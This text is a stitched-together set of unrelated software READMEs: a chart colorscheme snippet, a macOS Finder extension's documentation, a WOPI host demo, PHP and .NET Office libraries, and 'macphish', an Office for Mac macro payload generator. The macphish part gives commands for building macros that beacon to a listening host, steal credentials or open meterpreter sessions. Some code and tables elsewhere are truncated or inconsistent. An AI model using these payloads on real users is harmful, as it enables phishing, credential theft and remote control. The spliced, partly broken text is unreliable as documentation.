It is possible to build your custom colorscheme from scratch (without using the `custom` function) by simply defining the colors it contains. See example below.

```js
var myColors = ['red', 'green', 'blue', 'orange', 'black', 'yellow'];

// ...
    options: {
        plugins: {
            colorschemes: {
                scheme: myColors
            }
        }
    }
//...

```

## Building

You first need to install node dependencies (requires [Node.js](https://nodejs.org/)):

```bash
npm install
```

The following commands will then be available from the repository root:

```bash
gulp build            # build dist files
gulp build --watch    # build and watch for changes
gulp test             # run all tests
gulp test --watch     # run all tests and watch for changes
gulp test --coverage  # run all tests and generate code coverage
gulp lint             # perform code linting
gulp package          # create an archive with dist files and samples
```

# Behavior

This application allows you to customize the context menu for supported files.
When you right-click on a file within a [monitored folder](#monitored-folders) the extension extracts all available information for the file and generates the context menu.

|          |           |
|:---------|:--------- |
| Image menu example ![Image menu](Assets/menu_image.png) | Video menu example ![Video menu](Assets/menu_video.png) |
| Audio menu example ![Video menu](Assets/menu_audio.png) | PDF menu example ![PDF menu](Assets/menu_pdf.png) |
| Office menu example ![Office menu](Assets/menu_office.png) | Archive menu example ![Archive menu](Assets/menu_archive.png) | 
| Folder menu example ![Folder menu](Assets/menu_folder.png) | |

With the main application you can [customize the menu](#customize-the-menu-items). You can compose the file properties generating the menu items. It is also possible to use a [script code](#scripting-support) to format the menu items.

Remember that all rendering operations must be completed before the menu can be displayed. MacOS does not allow you to populate on-demand the menu but only before viewing, so any information extraction and formatting operation must be as fast as possible in order not to slow down the opening of the menu. 


# Installation

Go to the [releases](https://github.com/sbarex/MediaInfo/releases) page to download the latest version. 

Move the downloaded app on your Applications folder and launch it to set the monitored folders and the other settings. 

Then you need to enable the associated Finder Sync Extension on the System Preferences / Extensions.

![System preferences/Extensions](Assets/extensions.png)

Now right click (or `control` click) on a supported file within a monitored folder to see the contextual menu with the information.

**The precompiled application is not notarized or signed.** The application is compiled as universal binary (Intel and Apple Silicon processor).

**When you manually download the precompiled app directly you must strip quarantine flag.**
The first time you can launch the app with right click (or ctrl click) on the app icon and choose the open action.

Alternatively, you can open System Preferences > Security & Privacy > General (tab) then clicking the `Open Anyway` button.

If the system warns that the application is damaged, use the following terminal command:

```
$ xattr -cr ""FULL PATH OF THE MediaInfo .app (you can drag the file to get the pull path)""
```

This will resolve the error of an unsigned/damaged application when launching the app.

> **When the monitored folders are changed or when the Finder Sync extension is restarted, the System may display a confirmation warning to allow read access to the files of the monitored folders. _Access must be granted for the Finder extension to work._**

![Grant access](Assets/grant_access.png)


# Settings

## Monitored folders

With the Application you can customize the monitored folders and the properties to be shown inside the contextual menu.

![Folder settings](Assets/settings_folder.png)

You can also auto monitor external disk.

> **Information is shown only for files within the monitored folders (and their subfolders).**


## General

The _General_ tab allow to set some common options.

![General settings](Assets/settings_general.png)


|**Option**|**Description**|
|:-----------|:-----------------|
|Show menu icons|Show icons inside the contextual menu. You can customize the icon for each menu item. Some icons (image, video, pdf, page, ratio, media box, bleed box, art box, text document) respect the orientation (portrait or landscape) of the source. The _color_ icon respects the color space (RGB, CMYK, gray scale, B/W, Lab). The _flag_ icon will be changed to the country language flag when used within a media file.|
|Skip items with no data for the placeholders|Do not insert menu item with all empty placeholders.|
|Show info on a submenu|If enabled, on the contextual menu is added a submenu with the info items, otherwise all items are put on the main contextual menu.|
|Show main info on the submenu title|If enabled, a submenu with file information is added to the context menu, otherwise all items are placed in the main context menu.|
|Use first menu item as Main info|Use the first item as the main title for the submenu.|
|Menu action|Action performed when a menu item is selected. Some menu items always perform a custom action by ignoring this setting. You can use a [custom trigger](#triggers) to handle the menu action.|
|Metadata value on a submenu|In the metadata menu, show the value as a submenu or with the attribute name.|
|Allow rounded aspect ratio|For images and videos, allow to round the size for a better ratio. |
|Format for bytes|Allows you to choose how to display the values in bytes: using the system settings, in decimal format (1KB = 1000 bytes) or binary format (1KB = 1024 bytes)|
|Format for bits|Allows you to choose how to display the values in bits: in decimal format (1Kb = 1000 bits) or binary format (1Kb = 1024 bits)|
|Media engine priority|Allows you to choose the order in which the media engines are used to recognize images, videos and sounds. Not all engines can recognize all file properties. If one engine fails to process a file, the next engine is tried.  |

Media engines:

- _Core Media_: it uses the Apple CoreMedia APIs to parse media files. It is able to recognize many formats and most of their properties.
- _FFMpeg_: it uses the FFMpeg library to analyze multimedia files. It generally supports more files and provides more detailed information. However, it requires more resources. 
- _Metadata_: Use Apple Core Service APIs to extract information from metadata. It requires fewer resources but handle less information.


## Customize the menu items

For each managed format it is possible to customize the list of menu items. For each item you can combine plain text with the placeholder which will be filled with its file property.

![Customize a menu item](Assets/settings_menu_item.png)

When composing the menu title, all worthless placeholders are left blank. Multiple spaces or punctuation marks (comma and semicolon) or empty parentheses are automatically deleted. For this reason, it is suggested to separate placeholders whose value may not always be available with spaces, commas or semicolons.

You can also specify an explanatory icon for each item. Some icons (_image_, _video_, _pdf_, _page_, _ratio_, _media box_, _bleed box_, _art box_) respect the orientation (portrait or landscape) of the source. The _color_ icon respects the color space (RGB, CMYK, gray scale, B/W, LAB).

Use a single dash (`-`) to create a menu separator. Note that for a macOS limitation the separator element will not be shown with the usual dividing line.  

If you need more control over the information displayed by the menu items you can also use custom scripts (see the [Scripting support](#scripting-support) chapter).

Supported image formats:

- images handled by the macOS via CoreGraphics
- `.webp` with `libwebp`
- `.svg` files
- images handled by `FFMpeg`
- `.pbm` formats
- `.bpg` format (parsing the file header).

Extracting metadata is a wasteful operation that can slow down the contextual menu display. For this they are only processed if a metadata token is used. 
If you need to access metadata within a script, your code must have this comment at the beginning: `/* require-metadata */`.

## Office files

The following file formats are supported: `.docx`, `.rtfx`, `.pptx`, `.odt`, `.ods`, .`odp` (standard office files based on the `XML` format).

![Office settings](Assets/settings_office.png)

Extracting some metadata requires a deep scan of the main file. This can cause a delay in the display of the context menu of office files. For this reason, the deep scan is enabled only when requested by the chosen tokens are present. 
If you need to access metadata within a script, your code must have this comment at the beginning: `/* require-deep-scan */`

## Compressed archive files

The compressed archive files are handled by the `libarchive` library. 
The following file formats are supported: `.zip`, `.rar`, `.7z`, `.tar`, `.pax`, .`ar`, `.xar`, `.cab`.


![Compressed archive settings](Assets/settings_compressed.png)

With the `Max files` option, you can set the maximum number of files to process from the compressed archive. Set to zero to disable the limit. Please note that **processing a lot of entries can slow down the menu generation**. Furthermore, **displaying many menu items is a heavy operation**.

The archive file parsing operation is automatically stopped if it takes too long.

Available information:

|**info**|**placeholder**|**description**|**example**|
|:----|:----|:----|:----|

|compression format|``[[compression-format]]``||_gzip_|

## Folders

You can handle plain folders and even macOS bundles.

![Folders settings](Assets/settings_folders.png)

You can limit the processed data with these options:

|**option**|**description**|
|:----|:----|
|Ignore hidden files||
|Use generic icon|Use the standard icon associated to the file type instead of a customized icon.|
|Max files|Overall maximum number of files to process.|
|Max depth|Maximum depth of subfolders. Set to zero for no limit.|
|Max files per depth|Maximum number of files processed within a depth level. Set to zero for no limit.|

Processing the contents of a folder is a resource-intensive operation that can take time. **It is recommended to limit the number of files to be processed.** 

Processing takes place in two steps: 
- calculation of the total number of files and their occupation on disk. All files (including hidden files and those contained in bundles) are counted ignoring the settings on hidden files and bundles. 
- extraction of the list of files according to the limits set in the preferences. 

Each of these operations is aborted, returning a partial result, if it takes too long.

The total number of files and the folder size are acquired only if the specific token is used. 
If you need to access to the allocated size within a script, your code must begin with the comment `/* require-deep-scan */`. If is required to access only to the full size use the comment `/* require-fast-scan */` as the first line.

Available information:

|**info**|**placeholder**|**description**|**example**|
|:----|:----|:----|:----|
|number of files|``[[n-files]]``|Number of files and directories (including hidden files and those contained within bundles). _It is not affected by the setting of the maximum number of files, hidden files and bundle._ Extracting this information can slow down menu generation and stop if it takes too long, returning a partial value.|_150 files_, _More than 1500 files_ (if the operation was interrupted)|

|allocated folder size|``[[file-size-full]]``|Size on disk of all files inside the folder (considering also the metadata and resource fork). _It is not affected by the setting of the maximum number of files._ The extraction of this info can slow down the menu generation and stop if it takes too long, returning a partial value.|_155 Mb_, _More than 450 Mb_ (if the operation was interrupted)|
|files menu|``[[files]]``, ``[[files-with-icon]]``, ``[[files-plain]]``, ``[[files-plain-with-icon]]``|Submenu of contained files. The menu can be hierarchical or plain (with indented items). It is possible to show the icon of each files. _The items are limited according to the max files and depth options._||


## Other files

You can also create generic file menus to show basic information. You can use scripts to extract information from the file and place it on the menu. 

![Other settings](Assets/settings_others.png)

It is possible to create menus for specific file formats (identified through the UTI) and also for all files not directly managed. 

![Other file settings editor](Assets/settings_others_editor.png)

If a file conforms to several UTIs defined in the settings, the settings to be used will be chosen according to the order in which they were defined. 


# Menu actions

From the general settings you can set the action to be executed when you choose a menu item:

- do nothing
- open the file with the default application.

You can customize the action in several ways:

- Use a [special menu item](#common-actions) with custom action.
- Generate a menu item with a global script and define a custom function to be executed.
- Define a custom action [trigger](#triggers).

To handle custom action, see the [action functions](#action-functions).


## Common actions

For each file type there are some special menu items with a predefined action: 

|**info**|**placeholder**|**description**|**example**|
|:----|:----|:----|:----|
|open…|``[[open]]``|Menu item for opening the file with the default application.|_Open with Preview…_|
|open with…|``[[open-with:app]]`` where `app` contains the application full path base64 encoded. |Menu item for opening the file with a custom application. |_Open with Adobe Photoshop…_|
|settings…|``[[open-settings]]``|Menu item for open the MediaInfo application to customize settings. |_MediaInfo Settings…_|
|about…|``[[about]]``|Menu item for opening the GitHub page of this project. |_MediaInfo 1.6.1 (19) developed by SBAREX…_|
|copy to the clipboard…|``[[clipboard]]``|Menu item for copying the path to the clipboard. ||
|export info to the clipboard…|``[[export]]``|Menu item for copying the file info (as json) to the clipboard. ||


## Inline actions

Menu items created by a global script can have a custom action. You need to set the `action` attribute to `""custom""` and set `userInfo[""code""]` to the name (a string) of an exists function to call to handle the action.
 The function receives as a parameter an object with the info of the selected menu item:
 - `index` (Int): index inside the template
 - `tag`: tag of the associated menu item
 - `menuItem`
    - `image` (String)
    - `template` (String)
 - `action` (String)
 - `userInfo` ([String: Any])


## Trigger action

It is possible to define a trigger action executed when a user chooses a menu item. [See below](#action-trigger) for more info. 


# Scripting support

You can use a javascript code to:

- [Customize the menu items](#customize-the-menu-items):
  - [Output a text](#inline-scripts) inside a menu item.
  - [Generate multiple menu items](#global-scripts), with the possibility to define a custom action to be executed when the user chooses an item.
- Execute a [trigger](#triggers):
  - [Validate the file](#validate-trigger) before processing the file and generate the menu.
  - [Pre-render trigger](#before-render-trigger) to customize the menu item templates. 
  - [Action](#action-trigger) to be executed when the user clicks a menu item.


## Customize the menu items

It is possible to customize the menu items with a javascript code.

The javascript environment is shared with all scripts defined for the menu items, thus allowing you to set values in the code to pass from one script to another. The scripts are executed in order of belonging in the menu. 

Since the environment is shared among all the scripts, **remember to be careful not to declare the same global variables in multiple scripts using `let` and `const` statement** (If you need to redeclare a global variable you can use the `var` statement). 

The javascript environment will be reset every time a new contextual menu generation in required. So, you cannot share data between menu generate for different files.

Exceptions thrown during code execution are indicated by an exclamation icon inside the application. 

It is recommended that you enclose the code within an anonymous function: 

```javascript
(function() {
    let result = '';
    
    // your code here
    
    return result; // <- This will be the menu title.  
})()
```  

![Script editor](Assets/script_editor.png)

There are two script tokes: [inline](#inline-scripts) and [global](#global-scripts). 

The [before render trigger](#before-render-trigger) can be used to customize the templates defined in the settings before the menu generation.


### Exposed data

There are some common global variables.

The `fileData` variable is an object that contains the data representation of the currently processed file. 
The variable `settings` have the current settings. 

These two variables are locked and their properties cannot be changed (in strict mode, if you try to change one of their properties an exception is raised). _Any changes made to the `fileData` or` settings` will not affect the standard token process._


|var|type|description|
|:--|:---|:----------|
|`fileData`|Object|Properties of the processed file.|
|`currentFileType`|Int|Type of the processed file: `1` image, `2` video, `3` audio, `4` office, `5` PDF, `6` archive, `7` 3D model, `8` folder, `9` video track, `10` audio track, `11` others.|
|`settings`|Object|Current settings. |
|`templateItemIndex`|Int|Index (zero-based) of the processing menu item template. Defined only during rendering phase, for the asynchronous function this value is not guaranteed to remain valid.|
|`currentItem`|Object|Reference to the processing menu item ```{index: 0, menuItem: {image: """", template: ""[[file-size]]"", fileType: 1, action: ""default"", userInfo: {key1: 1, key2: ""value""} }```. Defined only during rendering phase, for the asynchronous function this value is not guaranteed to remain valid.|
|`debugMode`|Bool|`True` if the code is executed inside the main application.| 
|`macOS_version`|String|Current macOS version (like `""12.2.1""`).|

For a descriptions of `fileData` and `settings` properties see the [Common properties](#common-properties).

From the `Window` menu you can enable the JS Console to shows the output of the `console` commands.

![Log console](Assets/script_log.png)


### Inline scripts

The inline script token allows you to place the result of the script evaluation inside a menu item with any other tokens. 

The result of the script corresponds to the last statement executed in the code.
The last statement must return a string value (or null).

```javascript
(function() {
    const s1 = ""Hello World"";

    return s1 + "" from "" + fileData.fileName; // <- This will be the menu title.
})()
```

### Global scripts

The global token script allows you to create multiple menu items at once.

```javascript
(function() {
    let items = new Array();
    items.push({title: ""label 1"", image: null});
    items.push({title: ""label 2"", image: ""pencil""});
    items.push(""-""); // This is a separator
    items.push({
        title: ""submenu"",
        items: [
            {title: ""first""},
            ""second"",
        ]
    });

    return items;
})()
```

The last statement executed must return an array representing the menu items to add.

Each element in the returned array can be:

- A string that will be used as the title. You can use `""-""` to add a menu separator.
- An object with these properties:
  - `title` (string, **required**) The title of the menu item. 
  - `image` (string, optional) The image name for the menu item. See below for a list of the available images.
  - `checked` (bool, optional) Set to `true` to add the check mark to the menu item.
  - `indent` (int, optional) Indentation level (from 0 to 15).
  - `tag` (int, optional)
  - `userInfo` ([string: Any]) Dictionary of custom user information.
  - `action` (String) Action to be performed by selecting the menu item. It can be one of these values:
    - `""none""`: do nothing.
    - `""standard""`: execute the action set globally in the settings.
    - `""open""`: open the file with the default application.
    - `""openWith""`: open the file with an application. You need to set the full path of the application in `userInfo[""application""]`.
    - `""openSettings""`: open the MediaInfo settings application.
    - `""clipboard""`: copy the path to the clipboard.
    - `""export""`: copy the file info to the clipboard.
    - `""reveal""`: reveal a file on the Finder. You can set `userInfo[""file""]` with the path of the file to reveal, otherwise the current file is used.
    - `""about""`: open the GitHub page of this project.
    - `""custom""`: perform a custom action. You need to set the function _name_ to be called in `userInfo[""code""]`.
  - `items` (Array, optional) An array of the sub-elements. 
 
For each items inside the menu (standard and created by a global script), is required that the combination of tag and the formatted title **must** be unique. For the standard elements, the assigned tag is the zero index of the template used. 
    
The `image` property can be:

|value|image||
|:----|:----|:---|
|`null` or `""no-image""`||No image, but reserve a space if is set the visibility of icon in the menu items.|
|`no-space`||No image, and do not reserve a space.|
|`target-icon`||Current file icon.|

## Triggers

You can set up triggers to run for certain events: 
- trigger executed for validate the file before the info extraction.
- trigger executed before the menu generation, allows to customize the menu item templates 
- trigger executed when a menu item was selected. 


### Validate trigger

You can define a trigger to be executed before processing the file. 
The script must return a Boolean value. `false` prevents the file to be analyzed and no menu will be generated.

```javascript
// currentFile: path of the processing file
return currentFile.indexOf(""test"") < 0; // Skip files with ""test"" in the path.

```

> Please note that the javascript context of the validate trigger is not shared with the other code inside the menu items or with the action trigger.


### Before render trigger

This trigger can be used to change the menu items template defined in the settings.
The script must return `null` to not change the settings. Otherwise, must returns an array of menu item templates:

```javascript
return [
    {image: 'image', template: '[[size]]'},
    {image: 'clipboard', template: '[[clipboard]]'},
    {image: '', template: '-'}, // menu separator
    {image: '', template: ''}
];
```

For the `image` property see the [Global scripts](#global-scripts).

The trigger is evaluated inside an anonymous function, so any functions or variables are not propagated to other script.

If you need to export some data set as a property of the `globalThis`:

```javascript
globalThis.myfunc = function() { 
    \\...
};

globalThis.myvar = 4;

return null;

```

There are two ways to generate a menu item template with a script token:
- define the code as a base64 encoded string (with `toBase64()`) and insert it into the token:
```js
let code = ""return 'hello world';"";
let token = ""[[script-inline:""+toBase64(code)+""]]"";
```

- define a custom function for the `globalThis` and use its name for the token js attribute:
```js
globalThis.myfunc = function {
    return ""hello world"";
};

let token = ""[[script-inline:js:myfunc]]"";

```

### Action trigger

The user can define a custom trigger performed when a menu item is chosen.

The javascript context is the same as all the scripts called to generate the menu items. 

Within the action trigger the var `selectedMenuItem` is set with the properties of the chosen menu item.

To manage the action, see the [action functions](#action-functions).


## Utility functions

These functions are available during the execution of a javascript code.

|func|return type|description|
|:---|:-----|:---|
|`console.log(arg1[, arg2, ...])`|Void|Output a log in the Javascript Console Window (available from the `Window` menu).|
|`console.error(arg1[, arg2, ...])`|Void||
|`console.warn(arg1[, arg2, ...])`|Void||
|`console.info(arg1[, arg2, ...])`|Void||
|`console.debug(arg1[, arg2, ...])`|Void||
|`console.assert(condition, arg1[, arg2, ...])`|Void|Output a log only if the condition is true.|
|`toBase64(string)`|String|Encode the argument to a base64 value \*.|
|`fromBase64(string)`|String|Decode the argument from a base64 value \*.|
|`formatTemplate(template: String)`|{`output`: String, `filled`: Bool}|Format a template. Return an object, on `output` filed the formatted result, the `filled` field indicate if the return has some token filled.|
|`systemExecSync(command, [arguments])`|{`status`: Int, `output`: String}|Execute an external `command` passing the `arguments`. **The command must finish as soon as possible in order not to slow down the display**. The task is automatically stopped if it takes too long. |
 
_\* Some standard tokens (such as scripts and open-width) encode the argument with the base64 standard._


## Action functions

To manage the action when the user clicks on a menu item, these functions are available:

```js
/**
 * Open the file at the specified path with the default application.
 *
 * @param {String} path Full path of the file.
 *

 *            let exit_code = reason[0]; // Int
 *            let output = reason[1]; // String
 *            console.error(""fail: "", exit_code, output);
 *        },
 *    );
 *
 **/
function systemExec(command, arguments)

/**
 * Copy a text into the clipboard.
 *
 * @param {String} text 
 *
 * @returns {Bool} True on success.
 *
 * @example
 * systemCopyToClipboard(""Hello world"");
 *
 **/
function systemCopyToClipboard(text)
```

> These function are only available inside an action trigger or when executing a custom action from an item generated by a global script.

# Known bugs and limitations

- A managed folder placed in the Finder sidebar uses a wrong icon. 
This only happens for directly managed folders, not for subfolders. This is a common issue for many Finder Extension due to a macOS API limitation. **A temporary workaround is to manage the parent folder of the one located in the sidebar.**

- Menu item separators are not rendered as usual.
This is a limitation of the Apple API. 

- The Apple API allow to set only few option for each menu items: `title`, `tag`, `image` (automatically resized to 16x16 px), `indentationLevel`, `enabled`, `state`, `action` (the target is always the `FIFinderSync` instance). When the menu image is passed from the code to the System it will be reprocessed ad lose the template attribute. This prevent the B/W image to change the color from black to white when the menu item is selected.

- When multiple Finder Extensions are enabled, there is no way to set in witch order the menu of every extension is positioned.

- All menu items generated by Finder extensions are available only when all extensions complete their processing stage.

- Files/Folder inside CloudStorage (GoogleDrive, Dropbox, …) cannot be handled.


# Build from source

Clone the repository (do not download the source code because break the required git submodule):

```sh
git clone https://github.com/sbarex/MediaInfo.git 
```

Then open the Xcode project, change the signing team and build. First time the build process can be slow due to the compilation of the dependencies libraries.

The required libraries are linked inside the extension and compiled within Xcode, so no others external dependencies are required.


### Dependencies

This app uses these libraries:
- [`FFMpeg`](https://www.ffmpeg.org/)
- [`WebP`](https://developers.google.com/speed/webp/)
    - [`libpng`](http://www.libpng.org/)
    - [`jpeg-turbo`](https://libjpeg-turbo.org/) (require CMake to build)
- [`libarchive`](https://www.libarchive.org/)
    - [`liblz4`](https://lz4.github.io/lz4/)
    - [`libb2`](https://github.com/BLAKE2/libb2)
    - [`zstd`](https://github.com/facebook/zstd)
    - [`xz`](https://git.tukaani.org/xz.git)
- [`LineNumberTextView`](https://github.com/raphaelhanneken/line-number-text-view)
    
## Application processes

The application uses two XPC processes:
- _MediaInfo Settings XPC_: used by the main application to store the settings. This bypass the _AppGroup_ functionality that require a signed app to works.
- _MediaInfo Helper XPC_: used by the Finder Extension to read the settings an analyze the selected file. The XPC process can access to files within mounted disks (external or network disks) that would not be accessible by the MediaInfo Finder Extension.

This repository contains a Wopi Host demo.
work with Office Online Server 2016(OOS). 
Support DOCX Editing, and also PPTX,XLSX.
Welcome any contribution, and discussion of supporting coauthoring

## Requirements

Requires Office Online 2016 Server(preview). 
*No need Microsoft.CobaltCore.dll assembly.*

## Known Issues

Doesn't support coauthoring.

## Usage & Examples

#### Deploy OOS
[Deploy Guideline](https://docs.microsoft.com/en-us/officeonlineserver/deploy-office-online-server)   
Set editing enabled:  Set-OfficeWebAppsFarm -EditingEnabled:$true

#### Prepare Wopi Host
1.Set real local docs path as code below in WopiCobalthost\program.cs
```
// docsPath parameter may change to the real local path that save demo documents(word or excel file)
CobaltServer svr = new CobaltServer(@""D:\\wopi-docs"");
```
2.Set real hostname or domain as code below in WopiCobaltHost\CobaltServer.cs
```
// localhost may change to the real hostname or IP
m_listener.Prefixes.Add(String.Format(""http://localhost:{0}/wopi/"", m_port));
```
You can use FQDN as hostname for remote access.   
If you have no FQDN, you can use localhost and use [ngrok](https://ngrok.com/download) as proxy:ngrok.exe http -host-header=localhost 8080

3.Build and start this wopihost program   
Assume the demo doc file name is word.docx   
Now you can access http://[wopi.hostname]/wopi/files/word.docx, and get the CheckFileInfo response

#### Open OOS website
1.URLEncode wopihost address to:http%3a%2f%2fwopi.hostname%2fwopi%2ffiles%2fword.docx   
2.Use URL below to open OOS editing web page   
For word.docx:   
http://[OOS.hostname]/we/WordEditorFrame.aspx?WOPISrc=http%3a%2f%2fwopi.hostname%2fwopi%2ffiles%2fword.docx&access_token=token&ui=zh-CN   
For ppt.pptx:   
http://[OOS.hostname]/p/PowerPointFrame.aspx?PowerPointView=ReadingView&WOPISrc=http%3a%2f%2fwopi.hostname%2fwopi%2ffiles%2fppt.pptx&access_token=token&ui=zh-CN   
For Book1.xlsx   
http://[OOS.hostname]/x/_layouts/xlviewerinternal.aspx?WOPISrc=http%3a%2f%2fwopi.hostname%2fwopi%2ffiles%2fBook1.xlsx&access_token=token&ui=zh-CN

Office for Mac Macro Payload Generator
![macphish](macphish-alpha.png?raw=true ""macphish"")

## Attack vectors
There are 4 attack vectors available:
* beacon
* creds
* meterpreter
* meterpreter-grant

For the 'creds' method, macphish can generate the Applescript script directly, in case you need to run it from a shell. 

### beacon
On execution, this payload will signal our listening host and provide basic system information about the victim. The simplest way of generating a beacon payload is:
```
$./macphish.py -lh <listening host> 
```
By default, it uses curl but other utilities (wget, nslookup) can be used by modifying the command template. 

### creds
```
$./macphish.py -lh <listening host> -lp <listening port> -a creds
```
### meterpreter
The simplest way of generating a meterpreter payload is:
```
$./macphish.py -lh <listening host> -lp <listening port> -p <payload> -a meterpreter 
```
### meterpreter-grant
The generate a meterpreter payload that calls GrantAccessToMultipleFiles() first:
```
$./macphish.py -lh <listening host> -lp <listening port> -p <payload> -a meterpreter-grant
```

For meterpreter attacks, only python payloads are supported at the moment.

PHPProject is a library written in pure PHP that provides a set of classes to write to different project management file formats, i.e. Microsoft [MSProjectExchange](http://support.microsoft.com/kb/270139) (MPX) or [GanttProject](http://www.ganttproject.biz) (GAN). 
PHPProject is an open source project licensed under the terms of [LGPL version 3](https://github.com/PHPOffice/PHPProject/blob/develop/COPYING.LESSER). PHPProject is aimed to be a high quality software product by incorporating [continuous integration](https://travis-ci.org/PHPOffice/PHPProject) and [unit testing](http://phpoffice.github.io/PHPProject/coverage/develop/). You can learn more about PHPProject by reading the [Developers' Documentation](http://phpproject.readthedocs.org/) and the [API Documentation](http://phpoffice.github.io/PHPProject/docs/develop/).

- [Known issues](#known-issues)
- [Contributing](#contributing)
- [Developers' Documentation](http://phpproject.readthedocs.org/)
- [API Documentation](http://phpoffice.github.io/PHPProject/docs/master/)

### Features

- Create an in-memory project management representation
- Set file meta data (author, title, description, etc)
- Add resources from scratch or from existing one
- Add tasks from scratch or from existing one
- Output to different file formats: MSProjectExchange (.mpx), GanttProject (.gan)
- ... and lots of other things!

### Requirements

PHPProject requires the following:

- PHP 5.3+
- [XML Parser extension](http://www.php.net/manual/en/xml.installation.php)

### Installation

It is recommended that you install the PHPProject library [through composer](http://getcomposer.org/). To do so, add
the following lines to your ``composer.json``.

```json
{
    ""require"": {
       ""phpoffice/phpproject"": ""dev-master""
    }
}
```

Alternatively, you can download the latest release from the [releases page](https://github.com/PHPOffice/PHPProject/releases).
In this case, you will have to register the autoloader. Register autoloading is required only if you do not use composer in your project.

```php
require_once 'path/to/PhpProject/src/PhpProject/Autoloader.php';
\PhpOffice\PhpProject\Autoloader::register();
```

## Getting started

The following is a basic usage example of the PHPProject library.

```php
require_once 'src/PhpProject/Autoloader.php';
\PhpOffice\PhpProject\Autoloader::register();

$objPHPProject = new PhpProject();$objPHPProject = new PhpProject();

// Create resource
$objRes1 = $objPHPProject->createResource();
$objRes1->setTitle('UserBoy');

// Create a task
$objTask1 = $objPHPProject->createTask();
$objTask1->setName('Start of the project');
$objTask1->setStartDate('02-01-2012');
$objTask1->setEndDate('03-01-2012');
$objTask1->setProgress(0.5);
$objTask1->addResource($objRes1);

$oWriterGAN = IOFactory::createWriter($objPHPPowerPoint, 'GanttProject');
$oWriterGAN->save(__DIR__ . ""/sample.gan"");
```

More examples are provided in the [samples folder](samples/). You can also read the [Developers' Documentation](http://phpproject.readthedocs.org/) and the [API Documentation](http://phpoffice.github.io/PHPProject/docs/master/) for more details.

## Intro

[NPOI](https://github.com/tonyqus/npoi) extensions based on target framework `netstandard2.0`/`net6.0`.

There're a lot of useful extensions for you, core features are as follows:

- mapping a excel file data to a `DataTable` or `List<TEntity>`/`IEnumerable<T>`
- export `IEnumerable<TEntity>` or `DataTable` data to Excel file or Excel file bytes or even write excel file stream to your stream
- export `IEnumerable<TEntity>` or `DataTable` data to csv file or bytes.
- custom configuration/mappings by Attribute or FluentAPI(inspired by [FluentExcel](https://github.com/Arch/FluentExcel/))
- great flexibility by fluent InputFormatter/OutputFormatter/ColumnInputFormatter/ColumnOutputFormatter/CellReader

### GetStarted

1. Export list/dataTable to Excel/csv

    ``` csharp
    var entities = new List<Entity>();
    entities.ToExcelFile(string excelPath);
    entities.ToExcelBytes(ExcelFormat excelFormat);
    entities.ToCsvFile(string csvPath);
    entities.ToCsvBytes();
    ```

2. Read Excel/csv to List

    ``` csharp
    // read excel first sheet content to List<T>
    var entityList = ExcelHelper.ToEntityList<T>(string excelPath);

    // read excel first sheet content to IEnumerable<T>
    var entityList = ExcelHelper.ToEntities<T>(string excelPath);

    // read excel sheetIndex sheet content to a List<T>
    // you can custom header row index via sheet attribute or fluent api HasSheet
    var entityList1 = ExcelHelper.ToEntityList<T>(string excelPath, int sheetIndex);

    var entityList2 = CsvHelper.ToEntityList<T>(string csvPath);
    var entityList3 = CsvHelper.ToEntityList<T>(byte[] csvBytes);
    ```

3. Read Excel/csv to DataTable

    ``` csharp
    // read excel to dataTable directly,by default read the first sheet content
    var dataTable = ExcelHelper.ToDataTable(string excelPath);

    // read excel workbook's sheetIndex sheet to dataTable directly
    var dataTableOfSheetIndex = ExcelHelper.ToDataTable(string excelPath, int sheetIndex);

    // read excel workbook's sheetIndex sheet to dataTable,custom headerRowIndex
    var dataTableOfSheetIndex = ExcelHelper.ToDataTable(string excelPath, int sheetIndex, int headerRowIndex);

    // read excel to dataTable use mapping relations and settings from typeof(T),by default read the first sheet content
    var dataTableT = ExcelHelper.ToDataTable<T>(string excelPath);

    // read csv file data to dataTable
    var dataTable1 = CsvHelper.ToDataTable(string csvFilePath);
    ```

More Api here: <https://weihanli.github.io/WeihanLi.Npoi/docs/api/WeihanLi.Npoi.html>

### Define Custom Mapping and settings

1. Attributes

    Add `ColumnAttribute` on the property of the entity which you used for export or import

    Add `SheetAttribute` on the entity which you used for export or import,you can set the `StartRowIndex` on your need(by default it is `1`)

    for example:

    ``` csharp
    public class TestEntity
    {
        [Column(""Id"")]
        public int PKID { get; set; }

        [Column(""Bill Title"")]
        public string BillTitle { get; set; }

        [Column(""Bill Details"")]
        public string BillDetails { get; set; }

        [Column(""CreatedBy"")]
        public string CreatedBy { get; set; }

        [Column(""CreatedTime"")]
        public DateTime CreatedTime { get; set; }
    }

    public class TestEntity1
    {
        [Column(""Username"")]
        public string Username { get; set; }

        [Column(IsIgnored = true)]

        [Column(""IsActive"")]
        public bool IsActive { get; set; }
    }
    ```

1. FluentApi (Recommended)

    You can use FluentApi for great flexibility

    for example:

    ``` csharp
    var setting = FluentSettings.For<TestEntity>();
    // ExcelSetting
    setting.HasAuthor(""WeihanLi"")
        .HasTitle(""WeihanLi.Npoi test"")
        .HasDescription(""WeihanLi.Npoi test"")
        .HasSubject(""WeihanLi.Npoi test"");

    setting.HasSheetConfiguration(0, ""SystemSettingsList"", true);
    // setting.HasSheetConfiguration(1, ""SystemSettingsList"", 1, true);

    // setting.HasFilter(0, 1).HasFreezePane(0, 1, 2, 1);

    setting.Property(_ => _.SettingId)
        .HasColumnIndex(0);

    setting.Property(_ => _.SettingName)
        .HasColumnTitle(""SettingName"")
        .HasColumnIndex(1);

    setting.Property(_ => _.DisplayName)
        .HasOutputFormatter((entity, displayName) => $""AAA_{entity.SettingName}_{displayName}"")
        .HasInputFormatter((entity, originVal) => originVal.Split(new[] { '_' })[2])
        .HasColumnTitle(""DisplayName"")
        .HasColumnIndex(2);

    setting.Property(_ => _.SettingValue)
        .HasColumnTitle(""SettingValue"")
        .HasColumnIndex(3);

    setting.Property(_ => _.CreatedTime)
        .HasColumnTitle(""CreatedTime"")
        .HasColumnIndex(4)
        .HasColumnWidth(10)
        .HasColumnFormatter(""yyyy-MM-dd HH:mm:ss"");

    setting.Property(_ => _.CreatedBy)
        .HasColumnInputFormatter(x => x += ""_test"")
        .HasColumnIndex(4)
        .HasColumnTitle(""CreatedBy"");

    setting.Property(x => x.Enabled)
        .HasColumnInputFormatter(val => ""Enabled"".Equals(val))
        .HasColumnOutputFormatter(v => v ? ""Enabled"" : ""Disabled"");

    setting.Property(""HiddenProp"")
        .HasOutputFormatter((entity, val) => $""HiddenProp_{entity.PKID}"");

    setting.Property(_ => _.PKID).Ignored();
    setting.Property(_ => _.UpdatedBy).Ignored();
    setting.Property(_ => _.UpdatedTime).Ignored();
    ```

# Introduction

